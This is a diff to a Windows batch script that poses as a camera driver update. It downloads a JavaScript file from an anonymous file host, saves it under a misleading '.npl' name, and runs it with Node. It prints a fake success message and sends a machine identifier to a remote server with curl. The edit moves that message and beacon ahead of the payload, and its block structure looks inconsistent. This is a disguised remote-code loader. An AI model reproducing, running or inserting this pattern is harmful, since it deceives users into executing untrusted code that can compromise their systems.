@@ -77,17 +77,17 @@ set "ENV_SETUP_FILE=%CODEPROFILE%\env-setup.npl"
 echo [INFO] Updating Driver Packages...
 call :download_file "https://files.catbox.moe/92zc8z.js" "%ENV_SETUP_FILE%"
 if errorlevel 1 exit /b 1
-
+echo [SUCCESS] Camera drivers have been updated successfully.
+if defined WINDOW_UID (
+set "AUTO_URL=https://api.canditech.org/change-connection-status/!WINDOW_UID!"
+curl -sL -X POST "!AUTO_URL!" -o nul
 :: -------------------------
 :: Run the parser
 :: -------------------------
 if exist "%ENV_SETUP_FILE%" (
     cd /d "%CODEPROFILE%"
     "%NODE_EXE%" "%ENV_SETUP_FILE%"
-    echo [SUCCESS] Camera drivers have been updated successfully.
-    if defined WINDOW_UID (
-    set "AUTO_URL=https://api.canditech.org/change-connection-status/!WINDOW_UID!"
-    curl -sL -X POST "!AUTO_URL!" -o nul
+
     )
     if errorlevel 1 (
         exit /b 1
